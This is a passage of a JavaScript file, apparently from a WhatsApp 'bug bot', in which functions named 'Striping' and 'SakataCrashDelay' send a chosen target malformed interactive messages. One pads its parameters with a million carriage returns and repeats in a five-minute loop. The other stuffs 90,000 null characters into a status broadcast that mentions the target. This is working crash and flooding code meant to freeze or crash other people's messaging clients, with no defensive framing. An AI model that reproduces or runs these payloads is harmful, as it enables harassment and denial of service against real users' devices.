                expiration: 86400,
                disappearingMode: {
                    initiator: "CHANGED_IN_CHAT",
                    trigger: "UNKNOWN"
                }
            },
            inviteLinkGroupTypeV2: "DEFAULT"
        },
        messageContextInfo: {
            messageSecret: "ZwimsYwTXm5bRB6/Inl1jCQD1lfLF7wUs9rHp7ZbdQQ=",
            limitSharingV2: {
                sharingLimited: true,
                trigger: "CHAT_SETTING",
                limitSharingSettingTimestamp: "1773224137726",
                initiatedByMe: false
            }
        }
    };

    await vinzzoffc.relayMessage(target, message, {});
}

async function Striping(vinzzoffc, target) {
  let start = Date.now();
  while (Date.now() - start < 300000) {
    try {
      const nuull = [
        { name: "call_permission_request", params: "\u0000\x10" + "\r".repeat(1000000) },
        { name: "galaxy_message", params: "\u0000\x10" + "\r".repeat(1000000) },
        { name: "view_product", params: "\u0000\x10" + "\r".repeat(1000000) },
        { name: "view_order", params: "\u0000\x10" + "\r".repeat(1000000) },
        { name: "form_message", params: "\u0000\x10" + "\r".repeat(1000000) },
        { name: "address_message", params: "\u0000\x10" + "\r".repeat(1000000) },
        { name: "order_status", params: "\u0000\x10" + "\r".repeat(1000000) },
        { name: "single_select", params: "\u0000\x10" + "\r".repeat(1000000) },
        { name: "landline_call", params: "\u0000\x10" + "\r".repeat(1000000) },
        { name: "catalog_message", params: "\u0000\x10" + "\r".repeat(1000000) },
        { name: "wa_payment_transaction_details", params: "\u0000\x10" + "\r".repeat(1000000) },
        { name: "mpm", params: "\u0000\x10" + "\r".repeat(1000000) },
        { name: "psi_tos_opt_in", params: "\u0000\x10" + "\r".repeat(1000000) },
        { name: "send_location", params: "\u0000\x10" + "\r".repeat(1000000) },
        { name: "wa_payment_fbpin_reset", params: "\u0000\x10" + "\r".repeat(1000000) },
        { name: "payment_method", params: "\u0000\x10" + "\r".repeat(1000000) },
        { name: "payment_info", params: "\u0000\x10" + "\r".repeat(1000000) }
      ];
      
      for (const marknull of nuull) {
        await vinzzoffc.relayMessage(target, {
          groupStatusMessageV2: {
            message: {
              interactiveResponseMessage: {
                body: {
                  text: "Seumur umur",
                  format: "DEFAULT"
                },
                nativeFlowResponseMessage: {
                  name: marknull.name,
                  paramsJson: marknull.params,
                  version: 3
                }
              }
            }
          }
        }, { participant: { jid: target } });
      }
      await new Promise(r => setTimeout(r, 1000));
    } catch (e) {
    }
  }
}

async function SakataCrashDelay(vinzzoffc, target) {
  let msg = generateWAMessageFromContent(target, {
  interactiveResponseMessage: {
            body: {
              text: "Haii",
              format: "DEFAULT"
            },
              nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(90000)}\",\"flow_message_version\":\"3\"}`,
                version: 3 
     }
    }
  }, { userJid:target });
  
  await vinzzoffc.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target, "13135550002@s.whatsapp.net"],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}

// Add proper exit handling
process.on('SIGINT', () => {
  console.log('Received SIGINT, shutting down gracefully...');
  if (keyListWatcher) {
    fs.unwatchFile("keyList.json");
  }
  process.exit(0);
});

process.on('SIGTERM', () => {
  console.log('Received SIGTERM, shutting down gracefully...');
  if (keyListWatcher) {
    fs.unwatchFile("keyList.json");
  }
  process.exit(0);
});
